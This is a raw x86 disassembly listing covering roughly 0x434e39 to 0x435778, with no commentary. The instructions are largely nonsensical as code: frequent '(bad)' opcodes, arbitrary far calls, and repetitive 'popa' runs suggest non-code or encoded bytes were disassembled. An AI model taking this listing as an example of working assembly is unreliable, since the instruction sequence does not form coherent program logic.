  434e39:	popa   
  434e3a:	lock inc ebx
  434e3c:	popa   
  434e3d:	popa   
  434e3e:	popa   
  434e3f:	bound  esi,QWORD PTR [edx+0x18b26220]
  434e45:	repz les ebx,FWORD PTR [ebp+0x62]
  434e49:	(bad)
  434e4e:	lock push edi
  434e50:	popa   
  434e51:	popa   
  434e52:	popa   
  434e53:	lock stc 
  434e55:	popa   
  434e56:	popa   
  434e57:	popa   
  434e58:	or     eax,0xdb0d2075
  434e5d:	adc    BYTE PTR [eax+0x61],ch
  434e60:	popa   
  434e61:	or     eax,0x9aa718cd
  434e66:	mov    dl,0x76
  434e68:	adc    esi,DWORD PTR [ebp+0x28]
  434e6b:	shl    BYTE PTR [edx-0x4e],cl
  434e6e:	sub    BYTE PTR ds:0xeb626075,cl
  434e74:	mov    esi,0xd18b262
  434e79:	jne    0x434e9b
  434e7b:	or     eax,0x616848db
  434e80:	popa   
  434e81:	(bad)
  434e86:	and    BYTE PTR ds:0x616860db,cl
  434e8c:	popa   
  434e8d:	or     eax,0x9a0b8561
  434e92:	leave  
  434e93:	cmp    dh,BYTE PTR [esi+ebx*2]
  434e96:	call   0xc12ab043
  434e9b:	or     eax,0xcd0d4c75
  434ea0:	sbb    BYTE PTR [esi-0x26],dl
  434ea3:	cmp    BYTE PTR [edi],dl
  434ea5:	adc    ecx,DWORD PTR [edx+0x21626263]
  434eab:	loop   0x434f2b
  434ead:	arpl   WORD PTR [edx+0x62],sp
  434eb0:	lods   eax,DWORD PTR ds:[esi]
  434eb1:	pop    ebx
  434eb2:	add    DWORD PTR [ecx+0xd],ebp
  434eb5:	loop   0x434f35
  434eb7:	arpl   WORD PTR [edx+0x62],sp
  434eba:	test   DWORD PTR [ebx],ecx
  434ebc:	call   0xa8e8:0x5e343ac9
  434ec3:	popa   
  434ec4:	or     eax,0xf2934ccd
  434ec9:	shr    DWORD PTR [edx-0x69],1
  434ecc:	pusha  
  434ecd:	or     eax,0x17944c75
  434ed2:	fisubr DWORD PTR [edx+0x62]
  434ed5:	mov    dl,0x7e
  434ed7:	bound  esi,QWORD PTR [edx+0x18b26292]
  434edd:	(bad)  
  434ede:	in     al,0x8a
  434ee0:	arpl   WORD PTR [edx+0x62],sp
  434ee3:	pop    ss
  434ee4:	jne    0x434eee
  434ee6:	or     eax,0xdb212075
  434eeb:	pop    eax
  434eec:	push   0xe2256161
  434ef1:	add    DWORD PTR [ecx-0x12],ebp
  434ef4:	mov    cl,BYTE PTR ds:0xcd0d4c75
  434efa:	sbb    BYTE PTR [esi-0x26],dl
  434efd:	cmp    BYTE PTR [edi],dl
  434eff:	adc    edx,DWORD PTR [edx+0x62626263]
  434f05:	in     al,0x92
  434f07:	arpl   WORD PTR [edx+0x62],sp
  434f0a:	pop    ss
  434f0b:	jne    0x434f15
  434f0d:	or     eax,0xcd0d0875
  434f12:	jbe    0x434f2b
  434f14:	push   0x683c7521
  434f19:	popa   
  434f1a:	popa   
  434f1b:	popa   
  434f1c:	fsubr  st,st(2)
  434f1e:	cmp    al,0x61
  434f20:	mov    dl,0xf7
  434f22:	fcom   DWORD PTR [ebp+0x750d6118]
  434f28:	sbb    BYTE PTR [edi+0x22],dl
  434f2b:	jbe    0x434f8e
  434f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f2e:	or     eax,0xdc9c964
  434f33:	jne    0x434ecf
  434f35:	xchg   ebx,eax
  434f36:	repnz mov ds:0x9acd0d7e,al
  434f3c:	adc    ebp,DWORD PTR [eax+ebp*2]
  434f3f:	mov    dl,BYTE PTR [edi]
  434f41:	jne    0x434f98
  434f43:	fcom   DWORD PTR [ebp+0x3aee6169]
  434f49:	or     eax,0x17a26975
  434f4e:	jne    0x434fb9
  434f50:	or     eax,0xf2939a75
  434f55:	mov    ds:0x6975a13b,al
  434f5a:	jae    0x434f04
  434f5c:	or     eax,0xcd0d5575
  434f61:	xchg   BYTE PTR [esi-0x26],dl
  434f64:	xchg   BYTE PTR [ecx-0x7e176d33],ah
  434f6a:	or     eax,0xcd0d5575
  434f6f:	xchg   BYTE PTR [esi-0x26],dl
  434f72:	xchg   BYTE PTR ds:0xda565575,cl
  434f78:	call   0xd34:0x7392cda1
  434f7f:	jne    0x434fd6
  434f81:	out    dx,al
  434f82:	lea    ecx,ds:0x1cd85575
  434f88:	cmp    BYTE PTR [edi],dl
  434f8a:	jne    0x434fe1
  434f8c:	out    dx,al
  434f8d:	sbb    eax,0x22571caf
  434f92:	xchg   BYTE PTR [ecx-0x5b],ah
  434f95:	or     eax,0xbe64d864
  434f9a:	and    DWORD PTR [ebp-0xd],esi
  434f9d:	lods   eax,DWORD PTR ds:[esi]
  434f9e:	loop   0x434fa1
  434fa0:	imul   esp,DWORD PTR [ecx],0xe2253c75
  434fa6:	add    DWORD PTR [ecx+0x21],ebp
  434fa9:	jne    0x434fc3
  434fab:	mov    bl,0xe2
  434fad:	add    DWORD PTR [ecx+0x21],ebp
  434fb0:	jne    0x434fda
  434fb2:	inc    ebp
  434fb3:	loop   0x434fb6
  434fb5:	imul   esp,DWORD PTR [ecx],0xe2655075
  434fbb:	add    DWORD PTR [ecx+0x21],ebp
  434fbe:	jne    0x435024
  434fc0:	dec    esi
  434fc1:	loop   0x434fc4
  434fc3:	imul   esp,DWORD PTR [ecx],0xe2f13175
  434fc9:	add    DWORD PTR [ecx+0x13],ebp
  434fcc:	jne    0x435016
  434fce:	pop    ss
  434fcf:	jne    0x43503a
  434fd1:	or     eax,0xcd0d6975
  434fd6:	call   0x175d:0x75139a17
  434fdd:	jne    0x435034
  434fdf:	or     eax,0xcd0d5575
  434fe4:	xchg   BYTE PTR [edi],dl
  434fe6:	call   0x9a0b:0x85f3750d
  434fed:	leave  
  434fee:	cmp    dh,BYTE PTR [esi+ebx*2]
  434ff1:	call   0x75e4b19e
  434ff6:	dec    eax
  434ff7:	xchg   ebx,eax
  434ff8:	outs   dx,BYTE PTR ds:[esi]
  434ff9:	ss pop edi
  434ffb:	popa   
  434ffc:	popa   
  434ffd:	or     eax,0xb85f375
  435002:	call   0xa8e8:0x5e343ac9
  435009:	popa   
  43500a:	mov    eax,ds:0x6e935d75
  43500f:	dec    esp
  435010:	pop    edi
  435011:	popa   
  435012:	popa   
  435013:	or     eax,0xb85f375
  435018:	call   0xa8e8:0x5e343ac9
  43501f:	popa   
  435020:	pop    ss
  435021:	jne    0x43501c
  435023:	or     eax,0xb85f375
  435028:	call   0xa8e8:0x5e343ac9
  43502f:	popa   
  435030:	pop    ss
  435031:	jne    0x43508b
  435033:	adc    esi,DWORD PTR [ebp-0x6e]
  435036:	pop    ss
  435037:	jne    0x435099
  435039:	or     eax,0xb852875
  43503e:	call   0xa8e8:0x5e343ac9
  435045:	popa   
  435046:	xchg   ebx,eax
  435047:	repnz sbb al,0xd
  43504a:	int    0x50
  43504c:	(bad)  
  43504d:	outs   dx,DWORD PTR ds:[esi]
  43504e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435054:	pop    esi
  435055:	call   0xf2d6b202
  43505a:	push   edi
  43505b:	sub    eax,0x7517941f
  435060:	dec    esp
  435061:	or     eax,0xcd0df975
  435066:	dec    eax
  435067:	xchg   esp,eax
  435068:	or     eax,0x179499f7
  43506d:	jne    0x43501c
  43506f:	or     eax,0xcd0d5875
  435074:	pop    ebp
  435075:	xchg   esp,eax
  435076:	or     eax,0x179499f7
  43507b:	jne    0x43502e
  43507d:	xchg   ebx,eax
  43507e:	bnd jne 0x43502e
  435081:	or     eax,0x6fd6f3cd
  435086:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43508c:	pop    esi
  43508d:	call   0xf2d6b23a
  435092:	push   edi
  435093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435094:	pop    ds
  435095:	mov    dl,0x87
  435097:	or     eax,0xb853c75
  43509c:	call   0xa8e8:0x5e343ac9
  4350a3:	popa   
  4350a4:	or     eax,0xba93f3cd
  4350a9:	pusha  
  4350aa:	pop    ss
  4350ab:	int    0xf3
  4350ad:	lock leave 
  4350af:	push   0xf2936161
  4350b4:	jne    0x435067
  4350b6:	or     eax,0x6fd6f3cd
  4350bb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4350c1:	pop    esi
  4350c2:	call   0xf2d6b26f
  4350c7:	push   edi
  4350c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4350c9:	pop    ds
  4350ca:	mov    dl,0x80
  4350cc:	or     eax,0xb85f375
  4350d1:	call   0x133c:0xcd0d3ac9
  4350d8:	outs   dx,BYTE PTR ds:[esi]
  4350d9:	push   0x61a8e85e
  4350de:	pop    ss
  4350df:	jne    0x43511d
  4350e1:	lock jge 0x43514c
  4350e4:	popa   
  4350e5:	popa   
  4350e6:	or     eax,0x610d6075
  4350eb:	or     eax,0x6fd6f3cd
  4350f0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4350f6:	pop    esi
  4350f7:	call   0x1feab2a4
  4350fc:	xchg   ebx,eax
  4350fd:	outs   dx,BYTE PTR ds:[esi]
  4350fe:	or     BYTE PTR [ecx+0x61],ah
  435101:	popa   
  435102:	xchg   ebx,eax
  435103:	bnd jne 0x4350b3
  435106:	xchg   ebx,eax
  435107:	repnz int 0xb1
  43510a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43510b:	pop    ds
  43510c:	xchg   ebx,eax
  43510d:	outs   dx,BYTE PTR ds:[esi]
  43510e:	add    esp,DWORD PTR [ecx+0x61]
  435111:	popa   
  435112:	xchg   ebx,eax
  435113:	bnd jne 0x4350c3
  435116:	or     eax,0x6fd650cd
  43511b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435121:	pop    esi
  435122:	call   0xf2d6b2cf
  435127:	push   edi
  435128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435129:	pop    ds
  43512a:	fistp  QWORD PTR [eax]
  43512c:	xchg   ebx,eax
  43512d:	bnd jne 0x4350dd
  435130:	or     eax,0x6fd631cd
  435135:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43513b:	pop    esi
  43513c:	call   0xf2d6b2e9
  435141:	push   edi
  435142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435143:	pop    ds
  435144:	fmul   QWORD PTR [ebx+edx*4-0x6cb38a0e]
  43514b:	repnz int 0xad
  43514e:	push   esi
  43514f:	pusha  
  435150:	xchg   esp,eax
  435151:	pop    ss
  435152:	int    0xad
  435154:	xchg   ebx,eax
  435155:	bnd jne 0x435109
  435158:	or     eax,0x6fd650cd
  43515d:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435163:	pop    esi
  435164:	call   0xf2d6b311
  435169:	push   edi
  43516a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43516b:	pop    ds
  43516c:	fistp  QWORD PTR [eax]
  43516e:	xchg   ebx,eax
  43516f:	bnd jne 0x435123
  435172:	or     eax,0x6fd631cd
  435177:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43517d:	pop    esi
  43517e:	call   0xf2d6b32b
  435183:	push   edi
  435184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435185:	pop    ds
  435186:	fmul   QWORD PTR [ebx+edx*4-0x6cb38a0e]
  43518d:	repnz int 0xb1
  435190:	push   esi
  435191:	pusha  
  435192:	xchg   esp,eax
  435193:	pop    ss
  435194:	int    0xb1
  435196:	xchg   ebx,eax
  435197:	bnd jne 0x435147
  43519a:	xchg   ebx,eax
  43519b:	repnz int 0xb1
  43519e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43519f:	pop    ds
  4351a0:	out    0x88,eax
  4351a2:	or     eax,0xb853c75
  4351a7:	call   0xa8e8:0x5e343ac9
  4351ae:	popa   
  4351af:	lock stos BYTE PTR es:[edi],al
  4351b1:	push   0x7cee6161
  4351b6:	xchg   ebx,eax
  4351b7:	bnd jne 0x435167
  4351ba:	xchg   ebx,eax
  4351bb:	repnz int 0xb1
  4351be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4351bf:	pop    ds
  4351c0:	out    0x88,eax
  4351c2:	or     eax,0xb853c75
  4351c7:	call   0xa8e8:0x5e343ac9
  4351ce:	popa   
  4351cf:	lock mov ch,BYTE PTR [eax+0x61]
  4351d3:	popa   
  4351d4:	or     eax,0xb851875
  4351d9:	call   0x1348:0xcd0d3ac9
  4351e0:	outs   dx,BYTE PTR ds:[esi]
  4351e1:	push   0x61a8e85e
  4351e6:	pop    ss
  4351e7:	jne    0x435231
  4351e9:	or     eax,0xb851875
  4351ee:	call   0x135d:0xcd0d3ac9
  4351f5:	outs   dx,BYTE PTR ds:[esi]
  4351f6:	push   0x61a8e85e
  4351fb:	pop    ss
  4351fc:	jne    0x43525b
  4351fe:	lock mov esp,0x13626263
  435204:	jne    0x43521a
  435206:	pop    ss
  435207:	jne    0x435229
  435209:	or     eax,0x5e33f975
  43520e:	call   0xbc8b3bb
  435213:	call   0x1720:0xcd0d3ac9
  43521a:	push   0x171c7513
  43521f:	jne    0x435229
  435221:	or     eax,0x5e335875
  435226:	call   0xbc8b3d3
  43522b:	call   0x1708:0xcd0d3ac9
  435232:	push   0x8514750d
  435237:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43523d:	call   0xcd50b3ea
  435242:	sbb    dh,dl
  435244:	outs   dx,DWORD PTR ds:[esi]
  435245:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43524b:	pop    esi
  43524c:	call   0xbad6b3f9
  435251:	pop    ds
  435252:	or     eax,0xf29348cd
  435257:	imul   DWORD PTR [eax+0x33]
  43525a:	pop    esi
  43525b:	call   0xbc8b408
  435260:	call   0xd61c:0xcd0d3ac9
  435267:	outs   dx,DWORD PTR ds:[esi]
  435268:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43526e:	pop    esi
  43526f:	call   0xa550b41c
  435274:	sbb    dh,dl
  435276:	or     bx,WORD PTR [edx+0x22d63ac9]
  43527d:	pop    esi
  43527e:	call   0xbad6b42b
  435283:	dec    esi
  435284:	or     eax,0xf2935da5
  435289:	xchg   BYTE PTR [eax-0x17a10f2a],dl
  43528f:	test   al,0x61
  435291:	(bad)  
  435292:	outs   dx,DWORD PTR ds:[esi]
  435293:	or     ebx,DWORD PTR [edx+0x1fa73ac9]
  435299:	mov    dl,0x2c
  43529b:	or     eax,0xb851475
  4352a0:	call   0xa8e8:0x5e343ac9
  4352a7:	popa   
  4352a8:	or     eax,0x6fd618cd
  4352ad:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4352b3:	pop    esi
  4352b4:	call   0xbad6b461
  4352b9:	pop    ds
  4352ba:	or     eax,0xf29348cd
  4352bf:	imul   DWORD PTR [eax+0x33]
  4352c2:	pop    esi
  4352c3:	call   0xbc8b470
  4352c8:	call   0xb2f3:0x75a73ac9
  4352cf:	xchg   ebx,eax
  4352d0:	or     eax,0xb85f375
  4352d5:	call   0xa8e8:0x5e343ac9
  4352dc:	popa   
  4352dd:	out    dx,al
  4352de:	lea    ecx,ds:0xb853c75
  4352e4:	call   0xa8e8:0x5e343ac9
  4352eb:	popa   
  4352ec:	push   edi
  4352ed:	and    al,BYTE PTR [esi+0x640da561]
  4352f3:	leave  
  4352f4:	leave  
  4352f5:	and    DWORD PTR [ebp+0x55],esi
  4352f8:	das    
  4352f9:	loop   0x4352fc
  4352fb:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  435301:	add    DWORD PTR [ecx+0xd],ebp
  435304:	jne    0x43536f
  435306:	test   DWORD PTR [ebx],ecx
  435308:	call   0x939a:0xcd0d3ac9
  43530f:	repnz outs dx,BYTE PTR ds:[esi]
  435311:	cdq    
  435312:	dec    ebx
  435313:	sbb    ecx,esi
  435315:	popa   
  435316:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  43531c:	repnz sbb al,0x85
  43531f:	or     bl,BYTE PTR [edx]
  435321:	popa   
  435322:	popa   
  435323:	xchg   ebx,eax
  435324:	repnz sbb al,0x9d
  435327:	xor    al,0xcc
  435329:	popa   
  43532a:	popa   
  43532b:	out    0x9f,eax
  43532d:	or     eax,0xb856975
  435332:	call   0x939a:0xcd0d3ac9
  435339:	repnz outs dx,BYTE PTR ds:[esi]
  43533b:	cdq    
  43533c:	dec    ebx
  43533d:	sbb    ecx,esi
  43533f:	popa   
  435340:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435346:	repnz sbb al,0x85
  435349:	or     bl,BYTE PTR [edx]
  43534b:	popa   
  43534c:	popa   
  43534d:	xchg   ebx,eax
  43534e:	repnz sbb al,0x9d
  435351:	mov    ecx,0xb26161cc
  435356:	cmp    ecx,DWORD PTR ds:0x75176975
  43535c:	push   ebp
  43535d:	or     eax,0xb856975
  435362:	call   0x9a0b:0x85a23ac9
  435369:	leave  
  43536a:	cmp    dl,BYTE PTR [edi]
  43536c:	jne    0x4353d7
  43536e:	out    dx,al
  43536f:	add    eax,0x2f55ead6
  435374:	loop   0x435377
  435376:	imul   esi,DWORD PTR [edx-0x658af2cc],0x750d88ee
  435380:	push   ebp
  435381:	test   DWORD PTR [ebx],ecx
  435383:	call   0x139a:0xcd0d3ac9
  43538a:	outs   dx,BYTE PTR ds:[esi]
  43538b:	cdq    
  43538c:	imul   ebx,DWORD PTR [ebx],0x225761ce
  435392:	mul    DWORD PTR [ecx-0x5b]
  435395:	or     eax,0x21c9c964
  43539a:	jne    0x4353f1
  43539c:	das    
  43539d:	loop   0x4353a0
  43539f:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  4353a5:	add    DWORD PTR [ecx+0x62],ebp
  4353a8:	mov    dl,0x9a
  4353aa:	repz cdq 
  4353ac:	bound  esp,QWORD PTR [edx+0x62]
  4353af:	pop    ss
  4353b0:	jne    0x43534c
  4353b2:	or     eax,0xb856975
  4353b7:	call   0x939a:0xcd0d3ac9
  4353be:	push   es
  4353bf:	outs   dx,BYTE PTR ds:[esi]
  4353c0:	cdq    
  4353c1:	dec    ebx
  4353c2:	sbb    ecx,esi
  4353c4:	popa   
  4353c5:	fdiv   st,st(3)
  4353c7:	call   0x61d8:0x851c1e93
  4353ce:	popa   
  4353cf:	popa   
  4353d0:	xchg   ebx,eax
  4353d1:	push   ds
  4353d2:	sbb    al,0xd8
  4353d4:	imul   esp,eax,0x750d9fe7
  4353da:	imul   eax,DWORD PTR [ebp+0x3ac99a0b],0x939acd0d
  4353e4:	repnz outs dx,BYTE PTR ds:[esi]
  4353e6:	cdq    
  4353e7:	dec    ebx
  4353e8:	sbb    ecx,esi
  4353ea:	popa   
  4353eb:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4353f1:	repnz sbb al,0x85
  4353f4:	or     bl,BYTE PTR [edx]
  4353f6:	popa   
  4353f7:	popa   
  4353f8:	xchg   ebx,eax
  4353f9:	repnz sbb al,0x9d
  4353fc:	retf   
  4353fd:	int3   
  4353fe:	popa   
  4353ff:	popa   
  435400:	mov    dl,0x3b
  435402:	or     eax,0x75176975
  435407:	push   ebp
  435408:	or     eax,0xb856975
  43540d:	call   0x9a0b:0x85a23ac9
  435414:	leave  
  435415:	cmp    dl,BYTE PTR [edi]
  435417:	jne    0x435482
  435419:	out    dx,al
  43541a:	adc    esi,edx
  43541c:	jmp    0xe769:0x1e22f55
  435423:	ror    DWORD PTR ds:0xb855575,1
  435429:	call   0x61cc:0x34273ac9
  435430:	popa   
  435431:	or     eax,0x17949aa5
  435436:	adc    BYTE PTR [eax+0x61ce1b4b],bl
  43543c:	or     eax,0xb855575
  435441:	call   0x939a:0xcd0d3ac9
  435448:	repnz outs dx,BYTE PTR ds:[esi]
  43544a:	cdq    
  43544b:	dec    ebx
  43544c:	sbb    ecx,esi
  43544e:	popa   
  43544f:	test   DWORD PTR [edx],ecx
  435451:	sbb    ah,BYTE PTR [ecx+0x61]
  435454:	xor    al,0xb9
  435456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435457:	popa   
  435458:	popa   
  435459:	or     eax,0x6fd655cd
  43545e:	or     ebx,DWORD PTR [edx-0x5af2c537]
  435464:	call   0x1b4b:0xd06e1794
  43546b:	into   
  43546c:	popa   
  43546d:	or     eax,0x22579a75
  435472:	mul    DWORD PTR [ecx-0x5b]
  435475:	or     eax,0x21c9c964
  43547a:	jne    0x4354d1
  43547c:	das    
  43547d:	loop   0x435480
  43547f:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  435485:	add    DWORD PTR [ecx+0x62],ebp
  435488:	mov    dl,0x9a
  43548a:	repz mov ecx,0x17626263
  435490:	jne    0x43542c
  435492:	or     eax,0xb856975
  435497:	call   0x939a:0xcd0d3ac9
  43549e:	repnz outs dx,BYTE PTR ds:[esi]
  4354a0:	cdq    
  4354a1:	dec    ebx
  4354a2:	sbb    ecx,esi
  4354a4:	popa   
  4354a5:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4354ab:	repnz sbb al,0x85
  4354ae:	or     bl,BYTE PTR [edx]
  4354b0:	popa   
  4354b1:	popa   
  4354b2:	xchg   ebx,eax
  4354b3:	repnz sbb al,0x9d
  4354b6:	xor    al,0xcc
  4354b8:	popa   
  4354b9:	popa   
  4354ba:	out    0x9f,eax
  4354bc:	or     eax,0xb856975
  4354c1:	call   0x939a:0xcd0d3ac9
  4354c8:	repnz outs dx,BYTE PTR ds:[esi]
  4354ca:	cdq    
  4354cb:	dec    ebx
  4354cc:	sbb    ecx,esi
  4354ce:	popa   
  4354cf:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4354d5:	repnz sbb al,0x85
  4354d8:	or     bl,BYTE PTR [edx]
  4354da:	popa   
  4354db:	popa   
  4354dc:	xchg   ebx,eax
  4354dd:	repnz sbb al,0x9d
  4354e0:	retf   
  4354e1:	int3   
  4354e2:	popa   
  4354e3:	popa   
  4354e4:	mov    dl,0x3b
  4354e6:	or     eax,0x75176975
  4354eb:	push   ebp
  4354ec:	or     eax,0xb856975
  4354f1:	call   0x9a0b:0x85a23ac9
  4354f8:	leave  
  4354f9:	cmp    dl,BYTE PTR [edi]
  4354fb:	jne    0x435566
  4354fd:	out    dx,al
  4354fe:	add    eax,0x2f55ead6
  435503:	loop   0x435506
  435505:	imul   esp,edi,0xa21caf34
  43550b:	out    dx,al
  43550c:	pop    edi
  43550d:	scas   eax,DWORD PTR es:[edi]
  43550e:	sbb    al,0x57
  435510:	and    dh,bh
  435512:	popa   
  435513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435514:	or     eax,0x750dc964
  435519:	call   0x8675:0xd557517
  435520:	xchg   ebx,eax
  435521:	repnz popa 
  435523:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435529:	repnz sbb al,0x85
  43552c:	or     bl,BYTE PTR [edx]
  43552e:	popa   
  43552f:	popa   
  435530:	xchg   ebx,eax
  435531:	repnz sbb al,0x9d
  435534:	xor    al,0xcc
  435536:	popa   
  435537:	popa   
  435538:	out    0x7c,eax
  43553a:	or     eax,0xcd0d9a75
  43553f:	xchg   BYTE PTR [ebp+ecx*1-0x65e86b6f],dl
  435546:	or     eax,0xa2a29a75
  43554b:	pop    ss
  43554c:	jne    0x4354e8
  43554e:	or     eax,0xa2a28675
  435553:	pop    ss
  435554:	jne    0x4354dc
  435556:	out    dx,al
  435557:	hlt    
  435558:	scas   eax,DWORD PTR es:[edi]
  435559:	sbb    al,0xd
  43555b:	int    0x9a
  43555d:	xchg   esp,eax
  43555e:	pop    ss
  43555f:	push   0x5755750d
  435564:	and    bl,BYTE PTR [edx+0x640da561]
  43556a:	fsub   DWORD PTR [edx+ecx*4+0x21]
  43556e:	jne    0x4355d4
  435570:	lods   eax,DWORD PTR ds:[esi]
  435571:	loop   0x435574
  435573:	imul   esp,DWORD PTR [ecx],0xe225f375
  435579:	add    DWORD PTR [ecx+0xd],ebp
  43557c:	jne    0x4355e2
  43557e:	test   DWORD PTR [ebx],ecx
  435580:	call   0xa8e8:0x5e343ac9
  435587:	popa   
  435588:	pop    ss
  435589:	jne    0x4355f4
  43558b:	and    DWORD PTR [ebp+0x31],esi
  43558e:	adc    al,0xe2
  435590:	add    DWORD PTR [ecx+0x21],ebp
  435593:	jne    0x4355f2
  435595:	and    dl,ah
  435597:	add    DWORD PTR [ecx+0x21],ebp
  43559a:	jne    0x4355f1
  43559c:	mov    bl,0xe2
  43559e:	add    DWORD PTR [ecx+0xd],ebp
  4355a1:	jne    0x435607
  4355a3:	test   DWORD PTR [ebx],ecx
  4355a5:	call   0x1369:0xcd0d3ac9
  4355ac:	outs   dx,BYTE PTR ds:[esi]
  4355ad:	push   0x61a8e85e
  4355b2:	or     eax,0x6fd6f3cd
  4355b7:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4355bd:	pop    esi
  4355be:	call   0xa550b76b
  4355c3:	xchg   edx,eax
  4355c4:	xchg   ebx,eax
  4355c5:	mov    edx,0x9322a74f
  4355ca:	fsubr  st,st(4)
  4355cc:	popa   
  4355cd:	popa   
  4355ce:	popa   
  4355cf:	or     eax,0xcd0d9275
  4355d4:	imul   ebp,DWORD PTR ds:0x31cd0d1f,0x9a0b6fd6
  4355de:	leave  
  4355df:	cmp    dl,dh
  4355e1:	pop    ds
  4355e2:	pop    esi
  4355e3:	call   0x1feab790
  4355e8:	lds    esi,FWORD PTR [edx+0xd]
  4355eb:	jne    0x435587
  4355ed:	push   esi
  4355ee:	jne    0x435659
  4355f0:	or     eax,0xcd5686cd
  4355f5:	imul   ecx,DWORD PTR ds:0xd921789,0xda17f7d1
  4355ff:	test   DWORD PTR ds:0xb853175,0xd3ac99a
  435609:	int    0x69
  43560b:	adc    ebp,DWORD PTR [esi+0x68]
  43560e:	pop    esi
  43560f:	call   0x755ab7bc
  435614:	imul   esi,eax,0x616161fc
  43561a:	or     eax,0xcd0d9275
  43561f:	imul   ebp,DWORD PTR ds:0x5dcd0d1f,0x9a0b6fd6
  435629:	leave  
  43562a:	cmp    dl,dh
  43562c:	pop    ds
  43562d:	pop    esi
  43562e:	call   0x1feab7db
  435633:	lds    eax,FWORD PTR [edx]
  435635:	or     eax,0x75569a75
  43563a:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x17910d69
  435644:	call   0x9a0b:0x855d750d
  43564b:	leave  
  43564c:	cmp    cl,BYTE PTR ds:0x6e1369cd
  435652:	push   0x61a8e85e
  435657:	pop    ss
  435658:	jne    0x4356c3
  43565a:	out    dx,al
  43565b:	(bad)  
  43565c:	or     eax,0xcd0d9275
  435661:	imul   ebp,DWORD PTR ds:0x55cd0d1f,0x9a0b6fd6
  43566b:	leave  
  43566c:	cmp    dl,dh
  43566e:	pop    ds
  43566f:	pop    esi
  435670:	call   0x1feab81d
  435675:	lds    esi,FWORD PTR [edi]
  435677:	or     eax,0x75569a75
  43567c:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x910d9469
  435686:	xchg   esp,eax
  435687:	pop    ss
  435688:	call   0x9a0b:0x8555750d
  43568f:	leave  
  435690:	cmp    cl,BYTE PTR ds:0x6e1369cd
  435696:	push   0x61a8e85e
  43569b:	pop    ss
  43569c:	jne    0x435707
  43569e:	out    dx,al
  43569f:	mov    ecx,DWORD PTR ds:0x75569a75
  4356a5:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x4911a69
  4356af:	call   0x7517:0xa269750d
  4356b6:	imul   esi,eax,0x62626318
  4356bc:	push   edi
  4356bd:	and    al,BYTE PTR [esi+0x640da561]
  4356c3:	fsub   DWORD PTR [edx+edx*4+0x21]
  4356c7:	jne    0x43571e
  4356c9:	lods   eax,DWORD PTR ds:[esi]
  4356ca:	loop   0x4356cd
  4356cc:	imul   esp,DWORD PTR [ecx],0xe2256975
  4356d2:	add    DWORD PTR [ecx+0xd],ebp
  4356d5:	jne    0x43572c
  4356d7:	test   DWORD PTR [ebx],ecx
  4356d9:	call   0xa8e8:0x5e343ac9
  4356e0:	popa   
  4356e1:	mov    eax,ds:0xd3e78675
  4356e6:	or     eax,0xb856975
  4356eb:	call   0xa8e8:0x5e343ac9
  4356f2:	popa   
  4356f3:	or     eax,0x602d86cd
  4356f8:	pop    ss
  4356f9:	int    0x86
  4356fb:	adc    esi,DWORD PTR [ebp+0x31]
  4356fe:	pop    ss
  4356ff:	jne    0x43575e
  435701:	or     eax,0x5e338675
  435706:	call   0xbc8b8b3
  43570b:	call   0x175d:0xcd0d3ac9
  435712:	push   0x8555750d
  435717:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43571d:	call   0xcd50b8ca
  435722:	xor    esi,edx
  435724:	outs   dx,DWORD PTR ds:[esi]
  435725:	or     ebx,DWORD PTR [edx-0x5af2c537]
  43572b:	call   0xa8e8:0x5e906e04
  435732:	popa   
  435733:	out    dx,al
  435734:	or     DWORD PTR [edi+0x22],edx
  435737:	call   0x64d6:0x640da561
  43573e:	sahf   
  43573f:	pop    edi
  435740:	popa   
  435741:	popa   
  435742:	and    edx,esp
  435744:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  435748:	lods   eax,DWORD PTR ds:[esi]
  435749:	loop   0x43574c
  43574b:	imul   esp,DWORD PTR [ecx],0x625c4ce2
  435751:	bound  esp,QWORD PTR ds:0xd6901e2
  435757:	jne    0x4356eb
  435759:	pop    ss
  43575a:	loop   0x435798
  43575c:	pop    esp
  43575d:	bound  esp,QWORD PTR [edx+0xd]
  435760:	loop   0x43578a
  435762:	pop    esp
  435763:	bound  esp,QWORD PTR [edx-0x7b]
  435766:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43576c:	call   0x75eab919
  435771:	call   0x5c28:0xe20d6bb2
  435778:	bound  esp,QWORD PTR [edx-0x7b]
